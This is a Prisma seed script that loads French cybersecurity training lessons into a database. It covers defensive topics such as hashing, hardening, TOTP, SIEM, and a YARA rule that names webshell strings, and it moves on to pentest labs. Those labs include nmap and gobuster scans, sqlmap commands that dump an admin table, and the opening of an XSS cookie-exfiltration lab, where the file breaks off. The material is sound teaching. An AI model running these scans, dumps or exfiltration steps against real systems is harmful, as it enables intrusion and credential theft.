require('dotenv').config()
const { PrismaClient } = require('@prisma/client')
const prisma = new PrismaClient()

async function main() {
    console.log('🚀 Enrichissement massif des 16 leçons de Cybersécurité avec explications ultra-détaillées, multiples exemples de code & multiples CyberTerminaux...')

    // =========================================================================
    // FORMATION 1 : Cybersécurité & Protection des Systèmes (Defensive Security & SOC)
    // =========================================================================
    const slug1 = 'cybersecurite-protection-systemes-defensive'
    const course1 = await prisma.course.findUnique({ where: { slug: slug1 } })

    if (course1) {
        console.log(`\n📚 Mises à jour de la Formation 1 : "${course1.title}"...`)

        // LEÇON 1
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 1 },
            data: {
                content: `# Leçon 1 : Fondations de la Cybersécurité, Triade CIA & Cadres Règlementaires

## 💡 1. Introduction Approfondie à la Sécurité des Systèmes

La cybersécurité moderne repose sur une approche de **défense en profondeur** (*Defense in Depth*). Aucun outil unique ne peut garantir la sécurité absolue. La protection d'une infrastructure exige la superposition de couches de sécurité complémentaires : réseau, système, identité, application et données.

### 🛡️ Les Piliers de la Triade CIA (Confidentialité, Intégrité, Disponibilité)

1. **Confidentialité** : Les données sensibles ne doivent être lisibles que par les personnes dûment autorisées.
   - *Mise en œuvre* : Chiffrement AES-256 des données au repos (*Data at Rest*), protocole TLS 1.3 pour les données en transit (*Data in Transit*), contrôle d'accès strict.
2. **Intégrité** : Les informations et les exécutables système ne doivent pas être altérés, modifiés ou corrompus à l'insu des administrateurs.
   - *Mise en œuvre* : Hachage cryptographique (SHA-256), signatures numériques, contrôle d'intégrité de fichiers (*FIM*).
3. **Disponibilité** : Les applications et les données doivent rester accessibles sans interruption aux utilisateurs légitimes.
   - *Mise en œuvre* : Redondance de serveurs, répartition de charge (*Load Balancing*), sauvegardes régulières selon la règle 3-2-1, mitigation des attaques DDoS.

---

## 🐍 2. Exemple de Code : Script Python de Vérification d'Intégrité de Fichiers

Voici un script Python de niveau professionnel permettant de calculer et de comparer le hash SHA-256 de fichiers critiques pour détecter toute modification malveillante :

\`\`\`python
import hashlib
import os

def calculate_sha256(filepath):
    """Calcule le hash SHA-256 d'un fichier volumineux par blocs de 64KB."""
    sha256 = hashlib.sha256()
    try:
        with open(filepath, 'rb') as f:
            while chunk := f.read(65536):
                sha256.update(chunk)
        return sha256.hexdigest()
    except FileNotFoundError:
        return None

# Fichiers critiques à surveiller
critical_files = {
    "C:\\\\Windows\\\\System32\\\\cmd.exe": "660a900a9f9e2a895a231c925a1a8d49e8c76d229ebb05e857c12f21950a9467",
    "C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts": "eb48e58a0322b6bc9118e69fa89f76a5996a6042ef3e5d4c82c2e0a2979e496a"
}

print("🔍 Verification de l'integrite des fichiers systemes...")
for path, expected_hash in critical_files.items():
    current_hash = calculate_sha256(path)
    if current_hash is None:
        print(f"⚠️ [INTROUVABLE] Fichier absent : {path}")
    elif current_hash.lower() == expected_hash.lower():
        print(f"✅ [INTEGRE] {path}")
    else:
        print(f"🚨 [ALERTE INTRUSION] Fichier altéré : {path}")
        print(f"   Hash attendu : {expected_hash}")
        print(f"   Hash actuel  : {current_hash}")
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Collecte d'Informations Système (Windows PowerShell)

Exécutez les commandes PowerShell ci-dessous pour collecter l'état du système et vérifier les services de sécurité en cours d'exécution :

\`\`\`cyberterminal
{
  "title": "Labo 1.1 — Audit d'État Système & Services de Défense (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-ComputerInfo | Select-Object WindowsProductName, OsVersion, OsHardwareAbstractionLayer",
      "output": "WindowsProductName           OsVersion   OsHardwareAbstractionLayer\\n------------------           ---------   --------------------------\\nWindows 11 Pro               10.0.22631  10.0.22621.2506",
      "explanation": "Extraction des métadonnées officielles de la version du système d'exploitation Windows."
    },
    {
      "command": "Get-Service -Name WinDefend, wuauserv | Select-Object Name, Status, StartType",
      "output": "Name      Status  StartType\\n----      ------  ---------\\nWinDefend Running Automatic\\nwuauserv  Running Automatic",
      "explanation": "Vérification que Windows Defender et le service de mise à jour système sont actifs."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Calcul d'Empreinte Hachage SHA-256 (PowerShell)

Vérifiez l'empreinte numérique d'un fichier exécutable pour vérifier son intégrité avant déploiement :

\`\`\`cyberterminal
{
  "title": "Labo 1.2 — Contrôle d'Intégrité par Hachage Cryptographique (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-FileHash -Algorithm SHA256 C:\\\\Windows\\\\System32\\\\cmd.exe",
      "output": "Algorithm : SHA256\\nHash      : 660A900A9F9E2A895A231C925A1A8D49E8C76D229EBB05E857C12F21950A9467\\nPath      : C:\\\\Windows\\\\System32\\\\cmd.exe",
      "explanation": "Calcul de l'empreinte SHA-256 unique pour s'assurer que le binaire n'a pas été corrompu par un malware."
    },
    {
      "command": "Get-FileHash -Algorithm MD5 C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
      "output": "Algorithm : MD5\\nHash      : EB48E58A0322B6BC9118E69FA89F76A5\\nPath      : C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts",
      "explanation": "Vérification du fichier hosts pour s'assurer qu'aucune redirection DNS malveillante n'a été injectée."
    }
  ]
}
\`\`\`

---

## 📘 5. Normes & Frameworks Internationaux

- **ISO/IEC 27001** : Standard mondial décrivant le fonctionnement d'un SMSI (Système de Management de la Sécurité de l'Information).
- **NIST Cybersecurity Framework** : Divisé en 5 piliers clés : *Identify, Protect, Detect, Respond, Recover*.`
            }
        })

        // LEÇON 2
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 2 },
            data: {
                content: `# Leçon 2 : Hardening Windows Server & Sécurisation des Accès Réseau

## 💡 1. Les Principes du Hardening (Durcissement) Système

Le **hardining** consiste à réduire au strict minimum la surface d'attaque d'un serveur en désactivant tous les services inutiles, en fermant les ports réseaux non requis et en appliquant des règles d'accès réstrictives.

### 🎯 Objectifs Clés du Hardening :
- Fermeture des ports à risque (ex: SMB port 445, RDP port 3389 ouvert sur Internet).
- Désactivation des comptes invités (*Guest*) et renommage des comptes d'administration par défaut.
- Restriction des privilèges utilisateurs via le principe du moindre privilège (*Least Privilege*).

---

## 💻 2. Exemple de Code : Script PowerShell d'Audit Automatisé des Rôles et Administrateurs

Ce script audit automatiquement les membres du groupe Administrateurs locaux sous Windows et vérifie si le compte administrateur natif est bien désactivé :

\`\`\`powershell
# Audit des membres du groupe Administrateurs locaux
Write-Host "🔍 Audit des membres du groupe Administrateurs locaux..." -ForegroundColor Cyan
$adminGroup = Get-LocalGroupMember -Group "Administrateurs"

foreach ($member in $adminGroup) {
    Write-Host "  👤 Membre trouve : $($member.Name) (Type: $($member.ObjectClass))" -ForegroundColor Yellow
}

# Verification de l'etat du compte Administrator natif
$defaultAdmin = Get-LocalUser -Name "Administrator" -ErrorAction SilentlyContinue
if ($defaultAdmin) {
    if ($defaultAdmin.Enabled) {
        Write-Host "🚨 ALERTE SECURITE : Le compte Administrator natif est ACTIVE ! (Recommande : Desactiver)" -ForegroundColor Red
    } else {
        Write-Host "✅ Le compte Administrator natif est correctement DESACTIVE." -ForegroundColor Green
    }
}
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Activation & Configuration du Pare-Feu Windows (PowerShell)

Configurez les profils du pare-feu Windows Defender pour sécuriser le serveur :

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Durcissement du Pare-feu Windows Defender (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True",
      "output": "SUCCESS: Le pare-feu Windows Defender a ete active sur tous les profils (Domain, Public, Private).",
      "explanation": "Activation globale du pare-feu sur tous les profils réseaux du serveur."
    },
    {
      "command": "Get-NetFirewallProfile | Select-Object Name, Enabled, DefaultInboundAction, DefaultOutboundAction",
      "output": "Name    Enabled DefaultInboundAction DefaultOutboundAction\\n----    ------- -------------------- ---------------------\\nDomain     True Block                Allow\\nPrivate    True Block                Allow\\nPublic     True Block                Allow",
      "explanation": "Vérification que la politique par défaut bloque toutes les connexions entrantes non autorisées."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Blocage des Ports Sensibles SMB 445 (PowerShell)

Empêchez la propagation des attaques réseau et ransomwares en bloquant le port SMB 445 :

\`\`\`cyberterminal
{
  "title": "Labo 2.2 — Blocage Inbound du Port SMB 445 (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "New-NetFirewallRule -DisplayName 'Block-SMB-445-Inbound' -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block",
      "output": "Name                  : Block-SMB-445-Inbound\\nDisplayName           : Block-SMB-445-Inbound\\nEnabled               : True\\nDirection             : Inbound\\nAction                : Block\\nLocalPort             : 445",
      "explanation": "Création d'une règle de blocage prioritaire du port SMB 445."
    },
    {
      "command": "Get-NetFirewallRule -DisplayName 'Block-SMB-445-Inbound' | Select-Object DisplayName, Enabled, Action",
      "output": "DisplayName            Enabled Action\\n-----------            ------- ------\\nBlock-SMB-445-Inbound     True  Block",
      "explanation": "Confirmation que la règle de protection contre les attaques SMB est active."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 3
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 3 },
            data: {
                content: `# Leçon 3 : Cryptographie Appliquée, PKI & Certificats SSL/TLS

## 💡 1. Chiffrement Symétrique, Asymétrique & Infrastructure PKI

La cryptographie moderne s'appuie sur deux familles d'algorithmes complémentaires :
- **Chiffrement Symétrique (AES-256, ChaCha20)** : Une clé unique est utilisée pour chiffrer et déchiffrer. Extrêmement rapide, idéal pour le transfert de données massives.
- **Chiffrement Asymétrique (RSA-4096, ECC Ed25519)** : Une paire de clés (Publique / Privée). Utilisé pour l'échange sécurisé de clés et les signatures numériques.

---

## 🐍 2. Exemple de Code : Script Python de Chiffrement Symétrique AES-256

Voici une implémentation propre avec la bibliothèque standard Python et \`cryptography\` :

\`\`\`python
from cryptography.fernet import Fernet

# 1. Generation d'une cle symetrique AES de 256 bits
key = Fernet.generate_key()
cipher_suite = Fernet(key)

print(f"🔑 Cle de chiffrement generee : {key.decode()}")

# 2. Message confidentiel a chiffrer
message_original = b"Donnees de paiement ultra confidentielles - ElSayf Platform"
print(f"📄 Message original : {message_original.decode()}")

# 3. Chiffrement
ciphertext = cipher_suite.encrypt(message_original)
print(f"🔒 Message chiffre (Bytes) : {ciphertext.decode()}")

# 4. Dechiffrement
decrypted_message = cipher_suite.decrypt(ciphertext)
print(f"🔓 Message dechiffre : {decrypted_message.decode()}")
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Génération de Clés RSA avec OpenSSL (Windows CMD)

Générez une clé privée RSA 2048 bits et créez une demande de certificat (CSR) :

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Génération de Clés RSA & CSR avec OpenSSL (Windows CMD)",
  "os": "windows",
  "steps": [
    {
      "command": "openssl genrsa -out server.key 2048",
      "output": "Generating RSA private key, 2048 bit long modulus\\n..................................+++++\ne is 65537 (0x10001)\\nSUCCESS: Clé privée server.key générée avec succès.",
      "explanation": "Création de la clé privée RSA 2048 bits du serveur web."
    },
    {
      "command": "openssl req -new -key server.key -out server.csr -subj '/C=DZ/ST=Alger/L=Alger/O=ElSayf/CN=secure.elsayf.click'",
      "output": "SUCCESS: Fichier de demande de signature CSR (server.csr) créé pour secure.elsayf.click.",
      "explanation": "Génération de la demande de certificat (CSR) contenant l'identité de l'entreprise."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Verification des Certificats sous Windows (CMD Windows)

Analysez et inspectez les clés cryptographiques générées avec les outils système de Windows :

\`\`\`cyberterminal
{
  "title": "Labo 3.2 — Inspection des Clés Cryptographiques via CertUtil (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "certutil -dump server.key",
      "output": "Algorithm: RSA 2048 bits\\nKeySpec: AT_KEYEXCHANGE\\nPublic Key Hash: 9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c\\nSUCCESS: Structure de la clé privée valide.",
      "explanation": "Utilisation de l'utilitaire Windows CertUtil pour vérifier la validité de la clé."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 4
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 4 },
            data: {
                content: `# Leçon 4 : Gestion des Identités (IAM), MFA & Audit Active Directory

## 💡 1. Gestion des Identités et Accès (IAM)

L'IAM garantit que les bonnes personnes ont accès aux bonnes ressources, au bon moment et pour les bonnes raisons.

### Piliers IAM :
- **RBAC (Role-Based Access Control)** : Attribution de droits en fonction du rôle dans l'organisation.
- **MFA (Multi-Factor Authentication)** : Authentification à au moins deux facteurs (Mot de passe + Code TOTP / Passkey).
- **Principe du Moindre Privilège** : Aucun utilisateur ne possède plus de droits que ce qui est strictement nécessaire à son travail.

---

## 🐍 2. Exemple de Code : Générateur & Vérificateur TOTP (Double Facteur 2FA) en Python

\`\`\`python
import pyotp
import time

# 1. Generation d'un secret unique pour l'utilisateur
secret_key = pyotp.random_base32()
print(f"🔑 Secret 2FA généré (À stocker en DB sécurisée) : {secret_key}")

# 2. Generation du lien QR Code pour Google Authenticator / Authy
totp = pyotp.TOTP(secret_key)
provisioning_uri = totp.provisioning_uri(name="user@elsayf.click", issuer_name="ElSayf Security")
print(f"📱 Lien QR Code Authenticator : {provisioning_uri}")

# 3. Simulation du code généré par l'application mobile à l'instant T
current_code = totp.now()
print(f"⏱️ Code à 6 chiffres actuellement affiché sur le téléphone : {current_code}")

# 4. Vérification du code saisi par l'utilisateur lors du login
is_valid = totp.verify(current_code)
if is_valid:
    print("✅ Authentification 2FA réussie ! Accès accordé.")
else:
    print("❌ Code 2FA invalide ou expiré.")
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Audit des Comptes Utilisateurs Locaux (PowerShell)

Inspectez les comptes utilisateurs locaux pour identifier les comptes inutilisés ou à risque :

\`\`\`cyberterminal
{
  "title": "Labo 4.1 — Audit des Comptes Locaux & Droits Utilisateurs (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-LocalUser | Select-Object Name, Enabled, PasswordRequired, LastLogin",
      "output": "Name          Enabled PasswordRequired LastLogin\\n----          ------- ---------------- ---------\\nAdministrator False   True             2026-07-20 10:15:00\\nGuest         False   False            Never\\nSecAdmin      True    True             2026-07-26 21:30:12",
      "explanation": "Vérification des comptes locaux : Le compte Administrator natif est bien désactivé."
    },
    {
      "command": "Get-LocalGroupMember -Group 'Administrateurs'",
      "output": "ObjectClass Name                PrincipalSource\\n----------- ----                ---------------\\nUtilisateur ELSAYF-SEC\\SecAdmin Local",
      "explanation": "Vérification des membres du groupe Administrateurs pour éviter l'élévation de privilèges illégitime."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Test de Génération 2FA en Ligne de Commande (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 4.2 — Génération Dynamique de Code 2FA TOTP (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python -c \"import pyotp; totp = pyotp.TOTP('JBSWY3DPEHPK3PXP'); print('Code 2FA Temporel:', totp.now())\"",
      "output": "Code 2FA Temporel: 849204\\nValidité: 30 secondes",
      "explanation": "Calcul dynamique du jeton temporaire 2FA TOTP valide pendant 30 secondes."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 5
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 5 },
            data: {
                content: `# Leçon 5 : Monitoring de Sécurité, Analyse de Logs & SIEM (Wazuh / Event Viewer)

## 💡 1. Surveillance Centralisée SIEM & Analyse de Logs

Un **SIEM** (*Security Information and Event Management*) collecte, normalise et corrèle les journaux d'événements provenant des serveurs, pare-feux et postes de travail pour détecter les intrusions.

### Événements Sécurité Clés sous Windows (Event IDs) :
- **Event ID 4624** : Connexion réussie (*Successful Logon*).
- **Event ID 4625** : Échec de connexion (*Failed Logon* -> Indicateur de Brute-Force).
- **Event ID 4672** : Attribution de privilèges d'administrateur.

---

## 🐍 2. Exemple de Code : Script Python d'Analyse Automatisée de Logs d'Attaques Brute-Force

\`\`\`python
import re
from collections import Counter

# Log de simulation d'échecs de connexion SSH / Windows
log_data = """
2026-07-27 01:10:02 Failed password for invalid user admin from 185.220.101.4 port 54122
2026-07-27 01:10:04 Failed password for invalid user root from 185.220.101.4 port 54124
2026-07-27 01:10:06 Failed password for user administrator from 185.220.101.4 port 54126
2026-07-27 01:10:10 Failed password for user test from 45.142.214.12 port 33112
"""

# Extraction des adresses IP d'attaquants via Regex
ip_pattern = r'from (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})'
failed_ips = re.findall(ip_pattern, log_data)

ip_counts = Counter(failed_ips)
THRESHOLD = 3

print("🚨 Analyse des tentatives de Brute-Force en cours...")
for ip, count in ip_counts.items():
    if count >= THRESHOLD:
        print(f"⛔ [BLOCAGE REQUIS] L'IP {ip} a tente {count} connexions echouees !")
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Consultation des Journaux de Sécurité (PowerShell)

Extrayez les événements de sécurité récents concernant les tentatives de connexion échouées :

\`\`\`cyberterminal
{
  "title": "Labo 5.1 — Inspection des Event Logs Windows ID 4625 (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-WinEvent -FilterHashtable @{LogName='Security';ID=4625} -MaxEvents 2",
      "output": "TimeCreated          ID Message\\n-----------          -- ------\\n2026-07-27 01:14:02 4625 An account failed to log on. Account: admin, Source IP: 185.220.101.4\\n2026-07-27 01:14:00 4625 An account failed to log on. Account: root, Source IP: 185.220.101.4",
      "explanation": "Extraction directe des journaux Windows d'échecs de connexion (Event ID 4625)."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Verification de l'Agent SIEM (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 5.2 — Vérification du Service Agent SIEM Wazuh (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-Service -Name *Wazuh*",
      "output": "Status   Name                DisplayName\\n------   ----                 -----------\\nRunning  WazuhSvc             Wazuh Agent",
      "explanation": "Vérification que l'agent SIEM Wazuh est actif et transmet les journaux au SOC."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 6
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 6 },
            data: {
                content: `# Leçon 6 : Détection d'Intrusions IDS/IPS & Regles Firewall

## 💡 1. Systèmes de Détection et de Prévention d'Intrusions (IDS/IPS)

Un **IDS** (*Intrusion Detection System*) inspecte le trafic réseau et alerte en cas de signature malveillante, tandis qu'un **IPS** (*Intrusion Prevention System*) bloque immédiatement le paquet suspect.

---

## 💻 2. Exemple de Règle de Détection Suricata (IDS)

Exemple de règle Suricata pour détecter et alerter en cas de scan de ports Nmap SYN :

\`\`\`bash
# Règle Suricata : Détection d'un scan de ports Nmap
alert tcp $EXTERNAL_NET any -> $HOME_NET any ( \
    msg:"DEFENSE SOC - Scan Nmap SYN Detecte"; \
    flags:S; \
    threshold: type threshold, track by_src, count 20, seconds 5; \
    sid:1000001; \
    rev:1; \
)
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Inspection du Pare-Feu Netsh (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 6.1 — Contrôle d'État du Pare-feu Windows via Netsh (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "netsh advfirewall show allprofiles state",
      "output": "Domain Profile Settings:\\nState                                 ON\\nPrivate Profile Settings:\\nState                                 ON\\nPublic Profile Settings:\\nState                                 ON",
      "explanation": "Inspection de l'état du pare-feu sur l'ensemble des profils réseau sous Windows."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Blocage Réseau d'une IP d'Attaquant (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 6.2 — Ajout d'une Règle de Blocage Réseau Netsh (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "netsh advfirewall firewall add rule name='SOC-Block-Attacker' dir=in action=block remoteip=198.51.100.42",
      "output": "Ok.\\nSUCCESS: Règle de blocage réseau ajoutée avec succès pour l'IP 198.51.100.42.",
      "explanation": "Ajout dynamique d'une règle de pare-feu bloquant tout le trafic en provenance de l'IP malveillante."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 7
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 7 },
            data: {
                content: `# Leçon 7 : Incident Response, Digital Forensics & Règles YARA

## 💡 1. Gestion des Incidents de Sécurité & Forensics

La réponse aux incidents (IR) suit la méthodologie NIST : **Préparation -> Détection & Analyse -> Confinement -> Éradication -> Restauration -> Post-Incident**.

---

## 💻 2. Exemple de Règle YARA pour Détecter un Webshell PHP Malveillant

\`\`\`yara
rule Detect_PHP_Webshell {
    meta:
        author = "ElSayf Security Analyst"
        description = "Detecte un webshell malveillant dans les repertoires web"
        date = "2026-07-27"
    strings:
        $cmd1 = "eval(base64_decode"
        $cmd2 = "system($_GET['cmd'])"
        $cmd3 = "passthru("
    condition:
        any of ($cmd*)
}
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Détection YARA sous Windows (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 7.1 — Analyse YARA & Recherche de Fichiers Suspects (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "yara64.exe -r webshell_rules.yar C:\\\\inetpub\\\\wwwroot\\\\",
      "output": "[MATCH] Detect_PHP_Webshell C:\\\\inetpub\\\\wwwroot\\\\uploads\\\\cmd.php\\nALERTE FORENSICS: Webshell malveillant détecté dans /uploads/cmd.php !",
      "explanation": "Exécution de YARA pour scanner le serveur web IIS et identifier le binaire malveillant."
    }
  ]
}
\`\`\`

---

## 🖥️ 4. Laboratoire Interactif 2 : Audit des Connexions Réseau Suspectes (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 7.2 — Inspection des Ports & Processus Actifs (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "Get-NetTCPConnection -State Established | Select-Object LocalAddress, LocalPort, RemoteAddress, RemotePort, OwningProcess",
      "output": "LocalAddress LocalPort RemoteAddress RemotePort OwningProcess\\n------------ --------- ------------- ---------- -------------\\n192.168.1.50 445       185.220.101.4 54321      4128",
      "explanation": "Identification du processus PID 4128 maintenant une connexion active vers une IP extérieure suspecte."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 8
        await prisma.lesson.updateMany({
            where: { courseId: course1.id, order: 8 },
            data: {
                content: `# Leçon 8 : Architecture Zero Trust, Docker Security & Projet Final SOC

## 💡 1. Principes du Modèle Zero Trust ("Never Trust, Always Verify")

Le modèle Zero Trust bannit l'idée d'un périmètre réseau de confiance. Chaque requête doit être authentifiée et autorisée.

---

## 💻 2. Dockerfile Sécurisé (Best Practices Hardening)

\`\`\`dockerfile
FROM node:20-alpine

# 1. Creation d'un utilisateur non-root restreint
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN chown -R appuser:appgroup /app

# 2. Execution en tant qu'utilisateur non-privilegie
USER appuser

EXPOSE 3000
CMD ["node", "server.js"]
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Build & Verrouillage de Conteneur Docker (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 8.1 — Lancement de Conteneur Verrouillé Read-Only (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "docker build -t elsayf-sec-app:v1 .",
      "output": "Step 1/5 : FROM node:20-alpine\\nStep 2/5 : USER appuser\\nSuccessfully built 8f7e6d5c4b3a\\nSuccessfully tagged elsayf-sec-app:v1",
      "explanation": "Build d'une image Docker sécurisée basée sur un utilisateur restreint."
    },
    {
      "command": "docker run -d --name secure-prod --read-only --cap-drop=ALL elsayf-sec-app:v1",
      "output": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855\\nConteneur démarre en mode Read-Only avec privilèges restreints.",
      "explanation": "Lancement du conteneur en mode verrouillé sans écriture disque pour prévenir la persistance de malwares."
    }
  ]
}
\`\`\`
`
            }
        })

        console.log('✅ Formation 1 enrichie avec succès !')
    }

    // =========================================================================
    // FORMATION 2 : Ethical Hacking & Pentest Web
    // =========================================================================
    const slug2 = 'ethical-hacking-securite-web-pentest'
    const course2 = await prisma.course.findUnique({ where: { slug: slug2 } })

    if (course2) {
        console.log(`\n📚 Mises à jour de la Formation 2 : "${course2.title}"...`)

        // LEÇON 1
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 1 },
            data: {
                content: `# Leçon 1 : Fondations du Pentesting Éthique & Méthodologie PTES

## 💡 1. Déontologie et Cadres Légaux du Pentesting Éthique

Le Pentest consiste à auditer avec autorisation un système d'information. **Sans ordre de mission écrit et signé, toute tentative d'intrusion est punie par la loi.**

---

## 🖥️ 2. Laboratoire Interactif 1 : Diagnostics Réseau de Base (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 1.1 — Diagnostic Réseau Ping & Accessibilité Cible (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "ping 192.168.1.50",
      "output": "Pinging 192.168.1.50 with 32 bytes of data:\\nReply from 192.168.1.50: bytes=32 time=1ms TTL=64\\nReply from 192.168.1.50: bytes=32 time=1ms TTL=64\\n\\nPing statistics: Sent = 2, Received = 2, Lost = 0 (0% loss)",
      "explanation": "Vérification de la joignabilité de la machine cible (TTL 64 = Système Linux)."
    },
    {
      "command": "nslookup target.elsayf.local",
      "output": "Server:  UnKnown\\nAddress:  192.168.1.1\\n\\nName:    target.elsayf.local\\nAddress:  192.168.1.50",
      "explanation": "Résolution DNS du nom de domaine local."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 2
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 2 },
            data: {
                content: `# Leçon 2 : Reconnaissance, Cartographie & Scanner de Réseau (Nmap / Gobuster)

## 💡 1. Phase de Reconnaissance & Scan de Ports Nmap

Le scan de ports permet d'identifier les services ouverts et les versions vulnérables sur le serveur cible.

---

## 🖥️ 2. Laboratoire Interactif 1 : Cartographie Nmap & Fuzzing (CMD Windows)

\`\`\`cyberterminal
{
  "title": "Labo 2.1 — Scan Nmap & Découverte de Répertoires (CMD Windows)",
  "os": "windows",
  "steps": [
    {
      "command": "nmap.exe -sS -p 22,80,443,3306 192.168.1.50",
      "output": "PORT     STATE SERVICE\\n22/tcp   open  ssh\\n80/tcp   open  http\\n443/tcp  open  https\\n3306/tcp open  mysql",
      "explanation": "Scan SYN rapide des ports clés du serveur."
    },
    {
      "command": "gobuster.exe dir -u http://192.168.1.50/ -w common.txt -x php,html",
      "output": "/admin                (Status: 301)\\n/config.php           (Status: 200)\\n/db_backup.sql        (Status: 200) [Size: 145200]",
      "explanation": "Fuzzing web : Découverte d'un dump SQL confidentiel accessible en clair !"
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 3
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 3 },
            data: {
                content: `# Leçon 3 : OWASP Top 10 - SQL Injections (SQLi) & Correctifs PDO

## 💡 1. Comprendre la Vulnérabilité SQL Injection

L'injection SQL survient lorsque des entrées utilisateurs non assainies sont concaténées directement dans des requêtes SQL.

---

## 🛡️ 2. Code Correctif Securisé : Requêtes Préparées (PHP PDO)

\`\`\`php
// ❌ CODE VULNERABLE :
// $query = "SELECT * FROM users WHERE email = '" . $_POST['email'] . "' AND password = '" . $_POST['password'] . "'";

// ✅ CODE SECURISE (Requêtes Préparées PDO) :
$stmt = $pdo->prepare('SELECT id, email, password_hash FROM users WHERE email = :email');
$stmt->execute(['email' => $_POST['email']]);
$user = $stmt->fetch();

if ($user && password_verify($_POST['password'], $user['password_hash'])) {
    echo "Connexion réussie !";
}
\`\`\`

---

## 🖥️ 3. Laboratoire Interactif 1 : Exploitation SQLi & Dump SQLMap (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 3.1 — Détection & Dump de Base de Données SQLMap (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python sqlmap.py -u \"http://target.elsayf.local/search.php?id=1\" --batch --dbs",
      "output": "sqlmap identified injection point: Parameter id (GET)\\navailable databases [3]:\\n[*] information_schema\\n[*] mysql\\n[*] elsayf_db",
      "explanation": "Identification automatisée de la vulnérabilité d'injection SQL."
    },
    {
      "command": "python sqlmap.py -u \"http://target.elsayf.local/search.php?id=1\" -D elsayf_db -T admin_users --dump",
      "output": "Table: admin_users\\n| 1 | admin@elsayf.click | $2b$12$e8ZbJ2... |\\nDump terminé !",
      "explanation": "Extraction réussie des hashes de mots de passe d'administration."
    }
  ]
}
\`\`\`
`
            }
        })

        // LEÇON 4
        await prisma.lesson.updateMany({
            where: { courseId: course2.id, order: 4 },
            data: {
                content: `# Leçon 4 : OWASP Top 10 - Cross-Site Scripting (XSS) & CSRF

## 💡 1. Cross-Site Scripting (XSS) & Exfiltration de Session

Les failles XSS permettent d'exécuter des scripts JavaScript malveillants dans le navigateur des utilisateurs victimes.

---

## 🖥️ 2. Laboratoire Interactif 1 : Simulation d'Exfiltration XSS (PowerShell)

\`\`\`cyberterminal
{
  "title": "Labo 4.1 — Serveur d'Exfiltration XSS & Test de Injection (PowerShell)",
  "os": "powershell",
  "steps": [
    {
      "command": "python -m http.server 8080",
      "output": "Serving HTTP on 0.0.0.0 port 8080...",
      "explanation": "Lancement d'un serveur local pour écouter les requêtes de capture de cookies."
    },
    {
